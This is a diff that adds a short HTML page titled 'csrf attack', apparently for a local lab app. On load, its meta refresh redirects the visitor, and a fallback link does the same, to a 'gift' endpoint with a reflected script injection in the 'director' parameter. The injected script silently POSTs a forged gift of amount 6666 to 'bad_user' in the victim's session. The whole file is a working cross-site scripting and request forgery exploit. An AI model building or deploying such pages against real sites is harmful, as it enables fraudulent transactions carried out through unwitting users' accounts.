@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>csrf attack</title>
+    <meta http-equiv="refresh" content="0;url=http://127.0.0.1:8000/gift?director=<script>var csrf = new XMLHttpRequest(); csrf.open('POST', '/gift/1', true);var data = new FormData(); data.append('username', 'bad_user'); data.append('amount', 6666); data.append('product', '1'); csrf.send(data);</script>">
+</head>
+<body>
+    <p>If you are not redirected, <a href="http://127.0.0.1:8000/gift?director=<script>var csrf = new XMLHttpRequest(); csrf.open('POST', '/gift/1', true);var data = new FormData(); data.append('username', 'bad_user'); data.append('amount', 6666); data.append('product', '1'); csrf.send(data);</script>">click here</a>.</p>
+</body>
+</html>
